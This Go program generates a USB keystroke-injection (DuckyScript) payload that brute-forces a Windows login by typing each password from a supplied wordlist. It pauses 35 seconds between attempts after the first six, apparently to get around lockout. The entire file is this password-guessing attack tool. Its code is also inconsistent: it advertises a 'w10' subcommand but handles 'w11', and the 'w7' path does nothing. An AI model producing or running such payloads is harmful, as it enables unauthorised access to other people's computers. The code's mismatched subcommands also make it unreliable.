package main

import (
"fmt"
"flag"
"os"
"bufio"
)

func main() {
   seven := flag.NewFlagSet("w7", flag.ExitOnError)
   sevenfile := seven.String("w", "", "Set Wordlist")
   
   ten := flag.NewFlagSet("w10", flag.ExitOnError)
   tenfile := ten.String("w", "", "Set Wordlist")
   
   if len(os.Args) < 2 {
      fmt.Println("Expected 'w7' and 'w10' subcommand")
      os.Exit(1)
   }
   
   switch os.Args[1] {
   
   case "w7":
      seven.Parse(os.Args[2:])
      if *sevenfile == "" {
         fmt.Println("Error: Wordlist is not set")
      } else {
         fmt.Println("file:", *sevenfile)
      }
   
   case "w11":
      ten.Parse(os.Args[2:])
      if *tenfile == "" {
         fmt.Println("Error: Wordlist is not set")
      } else {
      fmt.Println("")
      fmt.Println("File:", *tenfile)
      fmt.Println("Output file: PAYLOAD.txt")
      fmt.Println("Payload Generated!")
      fmt.Println("")
      }

      //open file
      file, _ := os.Open(*tenfile)
      defer file.Close()

      //new scaner
      scanner := bufio.NewScanner(file)

      //define empty slice array
      var list []string

      //read from file and apend to slice array
      for scanner.Scan() {
         list = append(list, scanner.Text())
      }

      //create payload file
      filee, _ := os.Create("PAYLOAD.txt")

      //write first line to payload file
      first := fmt.Sprintf("DELAY 2000\nESC\n")
      filee.WriteString(first + "\n")

      //read line 1 to 6 and write to payload
      for i, line := range list {
         if i<6 {
            content := fmt.Sprintf("DELAY 500\nSTRING %s\nENTER\nDELAY 500\nENTER\nDELAY 500\n", line)
            filee.WriteString(content + "\n")
         }
      }

      //read line 6 to n and write to payload
      for i, line := range list {
         if i>=6 {
            content := fmt.Sprintf("DELAY 35000\nDELAY 500\nENTER\nDELAY 500\nESC\nDELAY 500\nSTRING %s\nDELAY 500\nENTER\n", line)
            filee.WriteString(content + "\n")
         }
      }

   default:
      fmt.Println("Expected 'w7' and 'w10' subcommand")
      os.Exit(1)
   }
}
